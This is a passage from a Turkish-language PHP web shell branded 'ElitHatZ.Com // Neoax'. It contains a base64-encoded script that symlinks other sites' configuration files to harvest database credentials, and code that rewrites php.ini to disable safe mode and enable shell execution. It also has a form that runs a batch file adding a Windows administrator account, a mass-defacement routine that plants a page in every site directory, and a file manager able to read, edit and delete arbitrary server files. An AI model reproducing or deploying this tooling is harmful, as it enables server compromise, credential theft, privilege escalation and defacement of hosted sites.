yk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbWFuYWdlLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW15c2hvcC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictemVuY2FydC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1aQ3Nob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc21mL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZjIudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW1zL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bXMudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJ0aWNsZS9jb25maWcucGhwJywkc2l0ZXNzLictTndhaHkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy11cDIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZl9nbG9iYWwucGhwJywkc2l0ZXNzLictNi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlL2RiLnBocCcsJHNpdGVzcy4nLTcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29ubmVjdC5waHAnLCRzaXRlc3MuJy1QSFAtRnVzaW9uLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21rX2NvbmYucGhwJywkc2l0ZXNzLictOS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdHJhaWRudDEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLnBocCcsJHNpdGVzcy4nLTRpbWFnZXMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRzaXRlc3MuJy1EcnVwYWwudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWVtYmVyL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictMW1lbWJlci50eHQnKSA7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictYmlsbGluZ3MudHh0JykgOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdXBwb3J0cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9yZXF1aXJlcy9jb25maWcucGhwJywkc2l0ZXNzLictQU00U1MtaG9zdGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnQvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5nL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWJpbGxpbmcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZ3MvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtYmlsbGluZ3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0aW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0YmlsbHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxsL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxsLnR4dCcpOw0KfQ0KcHJpbnQgIjxicj48YnI+PGJyPjxmb250IGNvbG9yPXJlZD5Eb25lICEhIDxpbWcgc3JjPSdodHRwOi8vcnM3MTcucGJzcmMuY29tL2FsYnVtcy93dzE3My9wcmVzdG9uampydHIvU21pbGV5cy90aHRodGhHcmVhdEpvYjEuZ2lmfmMyMDAnICBoZWlnaHQ9JzcwJyB3aWR0aD0nNjAnPjwvZm9udD4iOw0K';
$file = fopen("Vhost.cin" ,"w+");
$write = fwrite ($file ,base64_decode($config));
fclose($file);
    chmod("Vhost.cin",0755);
   echo "<div align='center'><a href='Vhost-Config/Vhost.cin'><font color='#db003d' style='text-shadow: 2px 2px 8px #471321;'>--->Tıkla<---</font></a></div>";  
 echo '<hr width=100%><br><br>';
}
if (isset($_POST['safemode']))
{
   $datta = "Safe_Mod=Off
Shell_Exec=On
Exec=On";
   touch("php.ini");
   $safemodefucker = fopen('php.ini', 'w');
   fwrite($safemodefucker, $datta);
   fclose($safemodefucker);
}
if (isset($_POST['rdpcrack']))
{
echo '<br><hr width=100%>
<center>
	<div style="color: White">
<form name ="at" method="post">
	<h1 style="color: white">Windows Get Administrator && RDP Cracker</h1>
	<input class="texxt2" type="text" name="usr" placeholder="Kullanıcı Adı"><br><br>
	<input class="texxt2" type="text" name="pss" placeholder="Şifre"><br><br>
	<button class="button" type="submit" name="rdpfuck">Crack RDP</button>
</form><hr width=100%><br><br></center>';
}
if (isset($_POST['rdpfuck'])) {
	    echo '<br><hr width=100%>';
        $username = $_POST['usr'];
        $pass = $_POST['pss'];
    	$batdosyasi = "@echo off \nnet user ".$username." ".$pass." /add \nnet localgroup Administrators ".$username." /add";
		$crck = fopen("crack.bat", "w+");
		$pic = fwrite($crck, $batdosyasi);
		chmod("crack.bat", 0777);
		fclose($crck);
		$cmd = "crack.bat";
		system($cmd);
		echo '<center><font color="#471321"><br><h4>>>Kullanıcı Bilgileri<<</h4><h4>Username : '.$username.'</h4><h4>Password : '.$pass.'</h4></font></center><hr width=100%><br><br>';
	}
if (isset($_POST['massdeface'])) {
	echo '<br><hr width=100%><center>
	<form method="post"><br>
	<font color="#471321">Sitelerin Bulunduğu Dizin</font><br>
	<input type="text" style="background-color: black;color: white;border:1px solid #471321;text-align: center;width: 300px;" name="dizinx" value="'.getcwd().'/" /><br><br>
	<font color="#471321">Dosya Adı</font><br>
	<input type="text" class="texxt2" name="dadi" value="elit.php" /><br>
	<textarea style="background-color: black;color: white;border:1px solid #471321;margin: 2px;" name="indexxx" rows="17" cols="70">Index Kodlarınız</textarea><br>
	<input class="button" name="massxdeface" type="submit" value="Başla" /><br>
	</form></center><hr width=100%><br><br>';
}
if (isset($_POST['massxdeface'])){
	 echo '<br><hr width=100%><center>';
	 $dirxmd = opendir($_POST['dizinx']);
	 $indexxxx = $_POST['indexxx'];
     while (($dosya = readdir($dirxmd)) !== false)
     {
     
     if(is_dir($dosya) == True){
     $ddsdssd = $_POST['dizinx'].$dosya."/".$_POST['dadi'];
     if(file_put_contents($ddsdssd,$indexxxx))
          echo "<font color=#471321>http://".$dosya."/".$_POST['dadi']."</font><br>";
 }
 }
     closedir($dirxmd);

	 echo '</center><hr width=100%><br><br>';
}
echo "<hr width=100%>";
if(isset($_GET['filesrc'])){
    echo "<tr><td><font color='white'>Bulunduğun Dosya : ";
    echo base64_decode($_GET['filesrc']);
    echo '</tr></td></table><br />';
    echo('<font color="white"><pre>'.htmlspecialchars(file_get_contents(base64_decode($_GET['filesrc']))).'</pre></font>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center></font>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="#db003d">&#304;zinler De&#287;i&#351;tirildi</font><br />';
            }else{
                echo '<font color="yellow">&#304;zinler De&#287;i&#351;tirilemedi </font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="#db003d">Ad De&#287;i&#351;tirme Ba&#351;ar&#305;l&#305;</font><br />';
            }else{
                echo '<font color="red">Ad De&#287;i&#351;tirilemedi </font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="#db003d">D&#252;zenleme Ba&#351;ar&#305;l&#305;</font><br />';
            }else{
                echo '<font color="red">D&#252;zenleme Ba&#351;ar&#305;s&#305;z :/</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="#db003d">Dosya Silindi</font><br />';
            }else{
                echo '<font color="red">Dosya Silinemedi</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="#db003d">Dosya Silindi</font><br />';
            }else{
                echo '<font color="red">Dosya Silinemedi</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center><font color="white">Adı</font></center></td>
        <td><center><font color="white">Boyut</font></center></td>
        <td><center><font color="white">İzinler</font></center></td>
        <td><center><font color="white">Seçenekler</font></center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        $dirlink = base64_encode("$path/$dir");
        echo "<tr>
        <td><a href=\"?path=$dirlink\"><img src='https://cdn3.iconfinder.com/data/icons/soda-red/512/new-folder.png' width='24' height='20'></img> $dir</a></td>
        <td><center><font color='#db003d'>--</font></center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="#db003d">';
        elseif(!is_readable("$path/$dir")) echo '<font color="yellow">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Sil</option>
        <option value=\"chmod\">İzinler</option>
        <option value=\"rename\">Yeniden Adlandır</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = '<font color="#db003d">'.round($size/1024,2).' MB</font>';
        }else{
            $size = '<font color="#db003d">'.$size.' KB</font>';
        }
        $filelink = base64_encode("$path/$file");
        echo "<tr>
        <td><a href=\"?filesrc=$filelink&path=$pathen\"><img src='https://cdn1.iconfinder.com/data/icons/flat-design-basic-set-4/24/document-red-text-portrait-512.png' width='25' height='25'></img>$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="#db003d">';
        elseif(!is_readable("$path/$file")) echo '<font color="yellow">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Sil</option>
        <option value=\"chmod\">İzinler</option>
        <option value=\"rename\">Yeniden Adlandır</option>
        <option value=\"edit\">Düzenle</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}

echo '<hr width=100%><center><font color="white"><h1>ElitHatZ.Com // Neoax</h></font></center><hr width=100%><br><br>
</body>
</html>';

function perms($file){
    $perms = @fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    $info = 'p';
} else {
    $info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>
